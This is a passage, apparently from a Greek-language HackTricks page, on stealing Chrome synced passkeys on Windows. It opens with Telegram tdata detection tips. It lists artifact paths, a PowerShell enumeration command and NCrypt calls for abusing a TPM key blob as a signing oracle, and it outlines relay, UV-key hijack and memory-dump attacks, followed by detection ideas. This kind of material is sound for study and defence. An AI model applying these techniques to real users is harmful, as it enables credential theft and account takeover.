Συσχετίστε την recursive πρόσβαση στο `tdata` από μια διεργασία που δεν ανήκει στο Telegram με την ενεργοποίηση του `SeBackupPrivilege`, τα file opens με backup semantics, τη δραστηριότητα VSS ή μια child διεργασία `robocopy.exe` που χρησιμοποιεί το `/B`. Αναζητήστε επίσης rapid enumeration τόσο του `%APPDATA%` όσο και του `%LOCALAPPDATA%\Packages`, ακολουθούμενο από outbound connections από την ίδια διεργασία. Μετά το compromise, χρησιμοποιήστε τα **Settings → Devices** (ή **Privacy & Security → Active Sessions**) για να τερματίσετε μη αναγνωρισμένα sessions· η ενεργοποίηση του two-step verification από μόνη της δεν ανακαλεί μια authorization που έχει ήδη κλαπεί.<sup>[[10]](#references)[[13]](#references)</sup>

## Κλοπή διαπιστευτηρίων Passkeys / WebAuthn από το Chrome στα Windows

Αν αποκτηθεί code execution ως ο **victim user** σε έναν Windows host που χρησιμοποιεί **Chrome + Google Password Manager synced passkeys**, τα passkeys γίνονται ενδιαφέρον post-exploitation target ακόμη και **χωρίς admin/SYSTEM**.<sup>[[4]](#references)</sup>

### Ενδιαφέροντα τοπικά artifacts
```text
%LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
%LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
```
- **`Sync Data\LevelDB`** αποθηκεύει εγγραφές **`WebauthnCredentialSpecifics`** κωδικοποιημένες σε protobuf. Μια διεργασία του ίδιου χρήστη μπορεί να απαριθμήσει το **RP ID**, το **username**, το **credential ID** και το κρυπτογραφημένο υλικό ιδιωτικού κλειδιού για συγχρονισμένα passkeys.<sup>[[5]](#references)</sup>
- Το **`passkey_enclave_state`** αποθηκεύει την τοπική κατάσταση εγγραφής συσκευής, όπως τα **`wrapped_identity_private_key`** και το wrapped secret που χρησιμοποιείται για την ανάκτηση συγχρονισμένων διαπιστευτηρίων.<sup>[[4]](#references)</sup>

Γρήγορη αρχική αξιολόγηση:
```powershell
Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
Where-Object { $_.FullName -match 'passkey_enclave_state|Sync Data\\LevelDB' } |
Select-Object FullName, Length, LastWriteTime
```
### Τα TPM-bound key blobs μπορούν ακόμη να καταχραστούν ως local signing oracle

Αν ο browser εξάγει ένα TPM-backed identity key ως **`NCRYPT_OPAQUE_KEY_BLOB`** και αποθηκεύει αυτό το blob σε κατάσταση προσβάσιμη από τον χρήστη, το malware **δεν** χρειάζεται να εξαγάγει το raw private key. Μπορεί απλώς να κάνει re-import το blob στο **ίδιο μηχάνημα** και να ζητήσει από το τοπικό TPM να υπογράψει δεδομένα που ελέγχει ο attacker:<sup>[[4]](#references)[[6]](#references)</sup>
```c
NCryptOpenStorageProvider(...)
NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
NCryptSignHash(...)
```
Αυτό σημαίνει ότι το **hardware binding αποτρέπει την εξαγωγή εκτός συσκευής, αλλά όχι τη χρήση από τον ίδιο χρήστη στο compromised endpoint**.

### Πρακτικές διαδρομές abuse

1. **Pass-ta-key / device-identity relay**<sup>[[4]](#references)</sup>
- Κάντε enumerate τα `WebauthnCredentialSpecifics` από το LevelDB του Chrome.
- Ξεκινήστε ένα passkey login και αποκτήστε ένα νέο WebAuthn challenge.
- Χρησιμοποιήστε το κλεμμένο blob `wrapped_identity_private_key` στο TPM του victim για να υπογράψετε το request binding του cloud-authenticator.
- Κάντε relay το assertion που επιστράφηκε στο relying party.
- Αυτό είναι ιδιαίτερα χρήσιμο όταν το RP αποδέχεται `userVerification=preferred` ή δεν απορρίπτει assertions με **`UV=0`**.
2. **Pending UV-key hijack**<sup>[[4]](#references)</sup>
- Εξαναγκάστε re-onboarding διαγράφοντας το `passkey_enclave_state` ή στέλνοντας μια έγκυρη signed λειτουργία `device/forget`.
- Αν το onboarding αφήσει τη συσκευή σε κατάσταση **`uv_key_pending`**, καταχωρίστε ένα UV public key που ελέγχεται από τον attacker.
- Αν ο provider δεν επαληθεύει το attestation / secure-hardware origin για το νέο UV key, οι μεταγενέστερες υπογραφές από το attacker key αντιμετωπίζονται ως **`UV=1`**.
3. **Master-secret / SDS recovery theft**<sup>[[4]](#references)</sup>
- Εξαναγκάστε recovery ή rejoin ώστε το Chrome να ανακτήσει το synced-passkey master secret.
- Παρακολουθήστε τη δημιουργία/τροποποίηση του `passkey_enclave_state` και, στη συνέχεια, κάντε dump τη μνήμη του Chrome ενώ το plaintext **security domain secret (SDS)** βρίσκεται στη μνήμη.
- Χρησιμοποιήστε το SDS που ανακτήθηκε για να αποκρυπτογραφήσετε τα encrypted fields σε κάθε record `WebauthnCredentialSpecifics` και να ανακτήσετε portable WebAuthn private keys.

### DFIR / ιδέες ανίχνευσης

- Παρακολουθήστε τη **διαγραφή/αναδημιουργία** του `passkey_enclave_state`.<sup>[[4]](#references)</sup>
- Δημιουργήστε alert για abnormal πρόσβαση στο **`Sync Data\LevelDB`** του Chrome από non-browser processes.
- Δημιουργήστε alert για **memory dumps του Chrome** ή ύποπτη πρόσβαση στη μνήμη μεταξύ processes.
- Διερευνήστε επαναλαμβανόμενα prompts για **Google Password Manager recovery PIN** ή απροσδόκητο re-onboarding.
- Έχετε υπόψη ότι το WebAuthn **`signCount`** συχνά δεν είναι χρήσιμο για synced passkeys, επειδή μπορεί να παραμένει σταθερό· επομένως, η κλασική ανίχνευση clone είναι αδύναμη.

## References

- [1] [Unit 42 – Έρευνα σχετικά με χρόνια μη ανιχνευμένων επιχειρήσεων που στόχευαν τομείς υψηλής αξίας](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [2] [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing μέσω SMTP → αποκρυπτογράφηση credentials του hMailServer → Veeam CVE-2023-27532 σε SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [3] [Check Point Research – Μέσα στο Ink Dragon: Αποκάλυψη του relay network και της εσωτερικής λειτουργίας μιας stealthy offensive operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Unit 42 – Pass the Passkey: Μια νέα attack surface στο passwordless authentication](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
- [5] [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
- [6] [Microsoft – `NCryptCreatePersistedKey` / αποθήκευση κλειδιών CNG](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)
- [7] [0xWord – Hacking Windows: Επιθέσεις σε συστήματα και δίκτυα Microsoft](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
- [8] [Πώς λειτουργεί πραγματικά το Active Directory Data Store: Μέσα στο NTDS.dit (Μέρος 1)](https://blog.chrisse.se/?p=762)
- [9] [en.hackndo.com – Remote Lsass Dump Passwords](https://en.hackndo.com/remote-lsass-dump-passwords)
- [10] [Kaspersky Securelist – Το Armored Likho επεκτείνει το cyber-espionage arsenal του με το Still Toolkit](https://securelist.com/armored-likho-still-toolkit/121033)
- [11] [Microsoft Learn – Συνάρτηση CreateFileW και `FILE_FLAG_BACKUP_SEMANTICS`](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew)
- [12] [Microsoft Learn – Robocopy `/B` backup mode](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [13] [Telegram FAQ – τερματισμός ενεργών sessions](https://telegram.org/faq)
{{#include ../../banners/hacktricks-training.md}}
